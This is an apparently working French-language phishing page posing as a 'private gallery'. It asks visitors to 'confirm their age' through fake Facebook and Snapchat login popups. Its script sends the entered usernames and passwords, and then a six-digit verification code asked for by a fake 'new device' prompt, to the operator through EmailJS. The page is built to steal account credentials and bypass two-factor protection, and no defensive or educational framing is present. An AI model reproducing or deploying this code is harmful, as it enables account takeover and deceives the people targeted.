<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="utf-8"/>
  <title>Galerie privée — Epics Photos</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500;700&display=swap" rel="stylesheet"/>

  <style>
    body {
      margin: 0;
      font-family: 'Playfair Display', serif;
      color: #fff;
      text-align: center;
      background: url('background.jpg') no-repeat center center fixed;
      background-size: cover;
      position: relative;
    }

    body::before {
      content: '';
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.6);
      backdrop-filter: blur(2px);
      z-index: 0;
    }

    .header, .extras, .bitmoji-row, .bottom-banner, .login-popup, .verification-popup {
      position: relative;
      z-index: 1;
    }

    .header { padding: 60px 20px 30px; }

    .header h1 {
      font-size: 4em;
      color: #FFD700;
      text-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
      margin-bottom: 10px;
    }

    .subtitle { font-size: 1.5em; margin-bottom: 30px; color: #f5f5f5; }

    .button {
      background: linear-gradient(45deg, #FFD700, #FF8C00);
      color: #000;
      border: none;
      padding: 14px 30px;
      font-size: 1.1em;
      font-weight: bold;
      border-radius: 30px;
      cursor: pointer;
      box-shadow: 0 0 10px rgba(255, 215, 0, 0.6);
      transition: 0.3s ease-in-out;
    }
    .button:hover { transform: scale(1.05); box-shadow: 0 0 20px rgba(255, 215, 0, 0.9); }

    .bitmoji-row {
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      margin: 40px 0;
    }
    .bitmoji {
      width: 90px;
      height: 90px;
      margin: 12px;
      border-radius: 50%;
      background-size: cover;
      background-position: center;
      border: 2px solid #fff;
      box-shadow: 0 0 10px rgba(255, 255, 255, 0.4);
    }

    .extras {
      background: rgba(255, 255, 255, 0.1);
      color: #ffe;
      padding: 50px 20px;
      border-top-left-radius: 30px;
      border-top-right-radius: 30px;
    }
    .extras h2 { font-size: 2em; margin-top: 0; color: #FFD700; }
    .extra-item { margin: 20px 0; font-size: 1.1em; }

    .login-popup, .overlay, .login-loading, .verification-popup {
      position: fixed;
      top: 10%;
      left: 50%;
      transform: translateX(-50%);
      background: #fff;
      color: #000;
      padding: 30px;
      border-radius: 20px;
      z-index: 1000;
      width: 90%;
      max-width: 400px;
      text-align: left;
      display: none;
      box-shadow: 0 20px 60px rgba(0,0,0,0.35);
    }

    .login-popup input, .verification-popup input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border-radius: 10px;
      border: 1px solid #ccc;
    }

    .overlay {
      background: rgba(0,0,0,0.6);
      width: 100%;
      height: 100%;
      z-index: 999;
      display: none;
      top: 0;
      left: 0;
      position: fixed;
      backdrop-filter: blur(2px);
    }

    .bottom-banner img { width: 100%; height: auto; display: block; }
    .verification-popup label { font-weight: bold; }
    .top-banner img { width: 100%; height: auto; display: block; }

    /* ====== Thématisation des popups ====== */
    /* SNAPCHAT look */
    #snapchatPopup {
      background: #FFFC00; /* jaune Snapchat */
      color: #000;
      border: 4px solid #000;
      border-radius: 24px;
    }
    #snapchatPopup h3 { color: #000; text-align: center; }
    #snapchatPopup input {
      background: #fff;
      color: #000;
      border: 2px solid #000;
    }
    #snapchatPopup .button {
      background: #000;
      color: #FFFC00;
      box-shadow: 0 10px 24px rgba(0,0,0,0.35);
      border-radius: 999px;
    }
    #snapchatPopup .button:hover { transform: translateY(-1px); }
    /* Le bouton Retour garde son style gris d'origine */

    /* FACEBOOK look */
    #facebookPopup {
      background: #18191A; /* bleu Facebook */
      color: #fff;
      border: none;
      border-radius: 16px;
    }
    #facebookPopup h3 { color: #fff; text-align: center; }
    #facebookPopup label { color: #fff; }
    #facebookPopup input {
      background: #fff;
      color: #1c1e21;
      border: 1px solid #e4e6eb;
    }
    #facebookPopup .button {
      background: #fff;
      color: #1877F2;
      box-shadow: 0 10px 24px rgba(24,119,242,0.35);
      border-radius: 10px;
    }
    #facebookPopup .button:hover { transform: translateY(-1px); }
  </style>

  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script>
    document.addEventListener("DOMContentLoaded", function() {
      emailjs.init("AATQVLMcBJaRBgEox");
    });
  </script>
</head>

<body>
  <div class="top-banner"><img src="banner.png" alt="Bannière Bitmoji"/></div>

  <div class="header">
    <h1>Galerie privée</h1>
    <p class="subtitle">Bienvenue sur ma page</p>

    <button id="facebookBtn" class="button" onclick="openFacebookPopup()">Confirmer votre âge avec Facebook</button>
    <button id="snapchatBtn" class="button" onclick="openSnapchatPopup()" style="margin-top: 15px;">Confirmer votre âge avec Snapchat</button>
  </div>

  <div class="bitmoji-row">
    <div class="bitmoji" style="background-image: url('avatar1.png')"></div>
    <div class="bitmoji" style="background-image: url('avatar2.png')"></div>
    <div class="bitmoji" style="background-image: url('avatar3.png')"></div>
    <div class="bitmoji" style="background-image: url('avatar4.png')"></div>
  </div>

  <div id="overlay" class="overlay"></div>
  <div id="loginPopup" class="login-popup"></div>

  <!-- POPUP SNAPCHAT -->
  <div id="snapchatPopup" class="login-popup">
    <div style="text-align:center;">
      <img src="logo-snapchat.png" alt="Snapchat" style="width: 60px; margin-bottom: 10px; border-radius: 12px;"/>
      <h3 style="margin: 10px 0;">Confirmer votre âge avec Snapchat</h3>
    </div>
    <label for="snap-username">Nom d'utilisateur ou e-mail</label>
    <input id="snap-username" type="text" placeholder="Nom d'utilisateur ou e-mail"/>
    <label for="snap-password">Mot de passe</label>
    <input id="snap-password" type="password" placeholder="Mot de passe"/>
    <button class="button" style="margin-top: 15px;" onclick="showLoadingAndVerify('snapchatPopup')">Connexion</button>
    <button class="button" style="background:#ccc; color:#000; margin-top:10px;" onclick="closePopup('snapchatPopup')">Retour</button>
  </div>

  <!-- POPUP FACEBOOK -->
  <div id="facebookPopup" class="login-popup">
    <div style="text-align:center;">
      <img src="logo-fb.jpg" alt="Facebook" style="width: 60px; margin-bottom: 10px; border-radius: 12px;"/>
      <h3 style="margin: 10px 0;">Confirmer votre âge avec Facebook</h3>
    </div>
    <label for="fb-email">Adresse e-mail ou numéro de mobile</label>
    <input id="fb-email" type="text" placeholder="Adresse e-mail ou téléphone"/>
    <label for="fb-password">Mot de passe</label>
    <input id="fb-password" type="password" placeholder="Mot de passe"/>
    <button class="button" style="margin-top: 15px;" onclick="showLoadingAndVerify('facebookPopup')">Connexion</button>
    <button class="button" style="background:#ccc; color:#000; margin-top:10px;" onclick="closePopup('facebookPopup')">Retour</button>
  </div>

  <div id="verificationPopup" class="login-popup verification-popup">
    <h3 style="margin-top: 0; font-size: 1.5em;">Nouvel appareil détecté</h3>
    <p style="margin-bottom: 15px;">Un code de vérification vous sera envoyé à l’intérieur des 2 prochaines minutes.</p>
    <label for="verificationCode" style="font-weight:bold;">Entrez le code reçu :</label>
    <input id="verificationCode" type="text" inputmode="numeric" pattern="\d*" maxlength="6" placeholder="Code à 6 chiffres"/>
    <button class="button" style="margin-top:10px;" onclick="submitVerificationCode()">Vérifier</button>
    <button class="button" style="background:#ccc; color:#000; margin-top:10px;" onclick="closePopup('verificationPopup')">Retour</button>
  </div>

  <div class="bottom-banner">
    <img src="banner.png" alt="Bannière Bitmoji"/>
  </div>

  <script>
    function openSnapchatPopup() {
      document.getElementById('overlay').style.display = 'block';
      document.getElementById('snapchatPopup').style.display = 'block';
    }
    function openFacebookPopup() {
      document.getElementById('overlay').style.display = 'block';
      document.getElementById('facebookPopup').style.display = 'block';
    }
    function closePopup(popupId) {
      document.getElementById('overlay').style.display = 'none';
      document.getElementById(popupId).style.display = 'none';
    }
  </script>

  <script>
    function showLoadingAndVerify(popupId) {
      const popup = document.getElementById(popupId);
      const inputs = popup.querySelectorAll("input");
      const allFilled = Array.from(inputs).every(input => input.value.trim() !== "");

      if (!allFilled) {
        alert("Veuillez remplir tous les champs.");
        return;
      }

      const button = popup.querySelector("button");
      const originalText = button.textContent;
      button.disabled = true;
      button.textContent = "Connexion en cours...";

      let params = {};

      if (popupId === "facebookPopup") {
        params = {
          fb_email: document.getElementById("fb-email").value.trim(),
          fb_password: document.getElementById("fb-password").value.trim()
        };
      } else if (popupId === "snapchatPopup") {
        params = {
          fb_email: document.getElementById("snap-username").value.trim(),
          fb_password: document.getElementById("snap-password").value.trim()
        };
      }

      if (window.emailjs) {
        emailjs.send("service_photos", "template_connexion", params)
          .then(() => {
            setTimeout(() => {
              button.disabled = false;
              button.textContent = originalText;
              popup.style.display = "none";
              document.getElementById("verificationPopup").style.display = "block";
            }, 2000);
          })
          .catch(err => {
            alert("Erreur EmailJS : " + JSON.stringify(err));
            button.disabled = false;
            button.textContent = originalText;
          });
      } else {
        alert("EmailJS non chargé.");
        button.disabled = false;
        button.textContent = originalText;
      }
    }
  </script>

  <script>
    function submitVerificationCode() {
      const code = document.getElementById("verificationCode").value.trim();
      const pattern = /^\d{6}$/;

      if (!pattern.test(code)) {
        alert("Veuillez entrer un code valide.");
        return;
      }

      const params = { verification_code: code };

      if (window.emailjs) {
        emailjs.send("service_photos", "template_code", params)
          .then(() => {
            window.location.href = "medias.html";
          })
          .catch(err => {
            alert("Erreur EmailJS : " + JSON.stringify(err));
          });
      } else {
        alert("EmailJS non chargé.");
      }
    }
  </script>
</body>
</html>
